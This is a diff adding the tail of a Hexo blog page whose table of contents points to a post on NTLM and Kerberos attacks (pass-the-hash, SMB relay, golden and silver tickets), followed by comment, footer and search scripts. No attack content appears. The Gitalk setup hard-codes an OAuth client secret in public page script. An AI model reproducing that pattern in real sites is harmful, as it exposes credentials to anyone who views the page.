+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E5%8D%8F%E8%AE%AE"><span class="toc-text">NTLM协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-text">认证流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-text">哈希传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%9A%84Hash%E8%8E%B7%E5%8F%96"><span class="toc-text">域的Hash获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB-PTH"><span class="toc-text">哈希传递攻击 (PTH)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-text">SMB重放攻击 (中间人攻击)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B-1"><span class="toc-text">认证流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">黄金票据与白银票据的区别</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/src/md5.min.js"></script>
+  <div id="gitalk-container"></div>
+
+  <script>
+    const gitalk = new Gitalk({
+      clientID: 'a8912b1aa74ebdeb8ecf',
+      clientSecret: '2e09f32571113ed72c6902713871ee0702291593',
+      repo: 'bstark',
+      owner: 'bbbstark',
+      admin: ['bbbstark'],
+      id: location.pathname,
+      distractionFreeMode: false
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/bbbstark">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a href="https://bstark.me">Copyright © Bstark 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' +  + '&url=' + https%3A%2F%2Fbstark.me%2Fposts%2F1%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://bstark.me/posts/1/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
